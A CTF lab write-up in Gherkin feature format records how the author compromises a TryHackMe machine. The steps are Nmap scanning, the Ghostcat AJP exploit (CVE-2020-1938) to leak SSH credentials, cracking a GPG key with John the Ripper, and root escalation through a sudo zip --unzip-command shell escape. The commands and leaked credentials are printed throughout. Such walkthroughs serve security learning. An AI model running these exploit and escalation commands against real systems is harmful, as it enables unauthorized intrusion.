## Version 2.0
## language: en

Feature:
  Site:
    TryHackMe
  Category:
    CTF
  User:
    Ar4m1r3z
  Goal:
    Escalate privileges to get two flags that are root and user.

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Python          | 3.8.1       |
    | Gpg             | 2.2.20      |
    | John The Ripper | 1.9.0       |
  Machine information:
    Given I am accessing the machine 10.10.100.144
    And is running on port 8080

  Scenario: Information gathering
    Given that I run the following Nmap command
    """
    $ nmap -sV 10.10.100.144
    """
    Then I get the output
    """
    22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
    53/tcp   open  tcpwrapped
    8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
    8080/tcp open  http       Apache Tomcat 9.0.30
    """
    Then I can see that it has a port 8080
    And is using server HTTP

  Scenario: Fail: Get tomcat credentials
    Given I have a port 8080
    When I decide to search for a directory
    """
    $ dirb http://10.10.100.144
    """
    And there are no results

  Scenario: Fail: Get tomcat credentials
    Given I have a website
    When I decide to visit her
    Then I see it's the "Tomcat" page
    When I decide to go to "metasploit" to use get the credentials
    """
    msf5 > auxiliary/admin/http/tomcat_administration
    """
    And the auxiliary didn't work.

  Scenario: Success: First SSH Access
    Given "metasploit" didn't work
    When I decide to look for a vulnerability for the "ajp" service
    And I found one
    """
    cve-2020-1938
    """
    Then I look for an exploit
    """
    $ searchsploit ajp
    """
    And it generated a very good result
    """
    Apache Tomcat - AJP 'Ghostcat File Read/Inclusion | multiple/webapps/48143.py
    """
    When I run the exploit like this
    """
    $ python /usr/share/exploitdb/exploits/multiple/webapps/48143.py 10.10.100.144
    """
    Then I get an HTML with some credentials
    """
    <description>
        Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
    </description>
    """
    When I prove those credentials are SSH
    """
    $ skyfuck@10.10.100.144
    """
    And it worked.
    When I download the two files that the user has "skyfuck"
    """
    scp skyfuck@10.10.100.144:tryhackme.asc .
    scp skyfuck@10.10.100.144:credential.pgp .
    """
    Then the "tryhackme.asc" file is a public key
    And that's why I'm going to create a hash of that key
    """
    $ sudo gpg2john tryhackme.asc > hash
    """
    When I use that hash with "John the ripper"
    """
    $ sudo john --wordlist=rockyou.txt hash
    """
    Then I get another credential
    """
    alexandru (tryhackme)
    """

  Scenario: Fail: Second SSH Access
    Given some credentials
    When I decide to try another SSH session
    And it hasn't worked out

  Scenario: Success: Flag User
    Given the credentials didn't work
    When I decide to import the "tryhackme.asc"
    """
    $ sudo gpg --import tryhackme.asc
    """
    And it's to have him in my "public.key"
    When I'm going to decipher the "credential.pgp"
    """
    $ sudo gpg --decrypt credential.pgp
    """
    Then I see that he asks me for a password and I decide to try "alexandru"
    When I see that it works and it gives me other credentials
    """
    merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
    """
    Then I try them with an SSH and it worked
    When I get the flag "User.txt"

  Scenario: Success: Flag Root
    Given I have an SSH with the user "marlin"
    When you use this instruction
    """
    sudo -l
    """
    Then the result is this
    """
    (root : root) NOPASSWD: /usr/bin/zip
    """
    And I can run the program "zip" with "root" privilege
    When I go to Google to look for some exploit
    Then I find one that's very easy
    And I must first create a file
    """
    $ touch raj.txt
    """
    When I have to compress the file
    """
    $ sudo zip 1.zip raj.txt -T --unzip-command="sh -c /bin/bash"
    """
    And I'm already "root"
